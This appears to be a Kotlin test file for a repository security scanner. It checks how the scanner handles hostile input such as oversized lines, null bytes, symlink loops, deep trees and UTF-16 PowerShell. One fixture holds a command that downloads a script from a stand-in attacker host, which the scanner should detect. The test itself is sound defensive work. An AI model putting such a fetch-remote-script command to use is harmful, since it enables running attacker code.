package com.sal7one.wrapperguard.rules

import com.sal7one.wrapperguard.core.policy.EnforcementMode
import com.sal7one.wrapperguard.core.policy.ScanPolicy
import com.sal7one.wrapperguard.core.policy.ScanSettings
import java.nio.file.Files
import kotlin.io.path.writeBytes
import kotlin.io.path.writeText
import kotlin.test.Test
import kotlin.test.assertTrue

/** Hostile-input hardening: oversized lines, null bytes, UTF-16, symlink loops, deep trees. */
class HostileInputTest {

    @Test
    fun oversizedLineProducesNoticeInsteadOfCrash() {
        val root = Files.createTempDirectory("wg-hostile-line")
        root.resolve("gradlew").writeText("#!" + "x".repeat(20_000) + "\n")
        val report = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        assertTrue(report.notices.any { it.code == RuleIds.SCAN_FILE_SKIPPED }, "oversized line must be skipped with a notice")
    }

    @Test
    fun nullByteContentIsSkippedAsBinary() {
        val root = Files.createTempDirectory("wg-hostile-null")
        root.resolve("gradlew").writeBytes(byteArrayOf(0x23, 0x21, 0x00, 0x41, 0x42))
        val report = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        assertTrue(report.notices.any { it.code == RuleIds.SCAN_FILE_READ }, "null-byte content must be skipped")
    }

    @Test
    fun utf16LePowerShellIsDecodedAndAnalyzed() {
        val root = Files.createTempDirectory("wg-hostile-utf16")
        val text = "# comment\nInvoke-WebRequest https://evil.example.com/x.ps1\n"
        val le = text.toByteArray(Charsets.UTF_16LE)
        val bytes = byteArrayOf(0xFF.toByte(), 0xFE.toByte()) + le
        root.resolve("deploy.ps1").writeBytes(bytes)
        val report = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        assertTrue(
            report.findings.any { it.ruleId == RuleIds.NETWORK_COMMAND },
            "UTF-16LE PowerShell must be decoded and analyzed"
        )
    }

    @Test
    fun symlinkLoopTerminates() {
        val root = Files.createTempDirectory("wg-hostile-symlink")
        root.resolve("gradlew").writeText("#!/bin/sh\necho ok\n")
        val dir = root.resolve("loop")
        Files.createDirectories(dir)
        try {
            Files.createSymbolicLink(dir.resolve("back"), root)
        } catch (_: UnsupportedOperationException) {
            return // filesystem without symlink support — nothing to test
        }
        val report = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        assertTrue(report.scannedFiles >= 0, "scan must terminate on symlink loops")
    }

    @Test
    fun deepDirectoryTreeIsPruned() {
        val root = Files.createTempDirectory("wg-hostile-deep")
        var current = root
        repeat(80) {
            current = current.resolve("d")
            Files.createDirectories(current)
        }
        current.resolve("deep.sh").writeText("#!/bin/sh\necho deep\n")
        val report = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        assertTrue(report.scannedFiles <= 100, "deep trees must be pruned by maxDirectoryDepth")
    }
}
